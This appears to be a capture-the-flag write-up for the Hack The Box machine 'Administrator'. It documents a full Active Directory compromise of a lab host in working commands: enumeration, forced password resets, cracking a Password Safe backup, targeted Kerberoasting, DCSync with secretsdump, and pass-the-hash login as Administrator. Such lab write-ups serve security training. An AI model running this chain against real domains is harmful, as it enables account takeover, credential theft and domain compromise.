# HTB - Administrator

**IP Address:** `10.10.11.42`  
**OS:** Windows  
**Difficulty:** Hard  
**Tags:** #SMB, #WinRM, #BloodHound, #ShadowCredentials, #RPC, #PasswordCracking, #DCSync, #Kerberoast

**Extra initial information:**
- User: olivia
- Password: ichliebedich

---

## 1. Initial Enumeration

### 1.1 Host Discovery

```bash
ping 10.10.11.42
```

✅ Host is alive.

---

### 1.2 Port Scanning

Initial full TCP port scan:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.42 -oG allPorts
```

Identified several open ports. Followed by a detailed targeted scan with script and version detection:

```bash
nmap -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,51918,54283,54288,54302,54310 -sCV 10.10.11.42 -oN targeted -oX targetedXML
```

Exported results to XML for later web-based analysis — a technique I hadn’t used before and found helpful for clarity.

---

## 2. SMB and WinRM Access

Started with classic enumeration via CrackMapExec:

```bash
crackmapexec smb 10.10.11.42
```

Added the machine name to `/etc/hosts`:

```
10.10.11.42 administrator.htb
```

Used NetExec (modern CrackMapExec fork) for further enumeration:

```bash
netexec smb 10.10.11.42 --shares
netexec smb 10.10.11.42 -u olivia -p ichliebedich
```

✅ Valid credentials for `olivia`, but:

- Not a member of Remote Management Users → No RCE via SMB
    
- No shared folders available
    

Tried WinRM instead:

```bash
netexec winrm 10.10.11.42 -u olivia -p ichliebedich
```

✅ Login successful → Shell access via Evil-WinRM:

```bash
evil-winrm -i 10.10.11.42 -u olivia -p 'ichliebedich'
```

---

## 3. User Enumeration and RPC Abuse

Inside the WinRM shell, listed domain users:

```bash
net user
```

Tried to enumerate with `rpcclient` anonymously:

```bash
rpcclient -U "" 10.10.11.42 -N
```

❌ Failed. Retried with valid credentials:

```bash
rpcclient -U "olivia%ichliebedich" 10.10.11.42
```

✅ Success.

- Enumerated domain users and groups with `enumdomusers`, `enumdomgroups`
    

Dumped domain users:

```bash
rpcclient -U "olivia%ichliebedich" 10.10.11.42 -c 'enumdomusers' > users.txt
cat users.txt | grep -oP '\\[.*?\\]' | grep -v "0x" | tr -d '[]' | sponge users.txt
```

→ Cleaned with regex and `sponge` for clarity.

Attempted AS-REP Roasting:

```bash
GetNPUsers.py -no-pass -usersfile users.txt administrator.htb/
```

❌ No users vulnerable.  
Tried again with valid Olivia credentials → still no success.

---

## 4. LDAP and BloodHound Enumeration

While waiting for BloodHound setup, dumped LDAP data:

```bash
ldapdomaindump -u 'administrator.htb\\olivia' -p ichliebedich 10.10.11.42
```

Started a Python web server to browse the dump:

```bash
python3 -m http.server 80
```

Opened `domain_users.html`, `Remote Management Users.html`, reviewed domain structure.

Installed BloodHound CLI:

```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
```

```bash
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
```

```bash
sudo ./bloodhound-cli install
```

Collected BloodHound data with:

```bash
bloodhound-python -u 'olivia' -p 'ichliebedich' -c All --zip -ns 10.10.11.42 -d administrator.htb
```

Visualized paths → `olivia` has **GenericAll** on `michael`.

---

## 5. Lateral Movement to `michael`

Used password reset attack (ForceChangePassword) recommended by BloodHound:

```bash
net rpc password "michael" "newP@ssword2022" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
```

✅ Successfully reset password.

BloodHound shows `michael` has GenericAll over `benjamin`. Repeated attack:

```bash
net rpc password "benjamin" "newP@ssword2022" -U "administrator.htb"/"michael"%"newP@ssword2022" -S 10.10.11.42
```

✅ Password reset success. However:

- `benjamin` ∉ Remote Management Users
    
- Belongs to `Share Moderators`
    

---

## 6. Access via SMB and FTP

Used `smbmap` for recursive file listing:

```bash
smbmap -H 10.10.11.42 -u benjamin -p 'newP@ssword2022' -r
```

Nothing useful from SMB. Tried FTP with same credentials:

```bash
ftp 10.10.11.42
```

✅ Found and downloaded `Backup.psafe3`.

---

## 7. Cracking the Password Safe

Identified file as Password Safe DB. Used CLI utility:

```bash
pwsafe Backup.psafe3
```

❌ Prompted for password.

Extracted hash with `pwsafe2john`, then cracked with rockyou:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

✅ Cracked password: `tekieromucho`

Accessed safe and recovered passwords of 3 users. Most interesting: `emily`.

---

## 8. PrivEsc with `emily` via Kerberoasting

Logged in with Evil-WinRM as `emily`:

```bash
evil-winrm -i 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

BloodHound → `emily` has relation with `ethan`.

Used Targeted Kerberoast attack:

```bash
python3 targetedKerberoast.py -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --dc-ip 10.10.11.42
```

✅ Retrieved `ethan` TGS hash. Cracked it:

```bash
john hash_ethan --wordlist=/usr/share/wordlists/rockyou.txt
```

✅ Password: `limpbizkit`

---

## 9. DCSync Attack as Domain Admin

BloodHound → `ethan` can perform DCSync.

Executed:

```bash
secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
```

✅ Dumped `Administrator` NTLM hash.

Logged in:

```bash
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

🏁 Root shell obtained.

---

# ✅ MACHINE COMPLETE
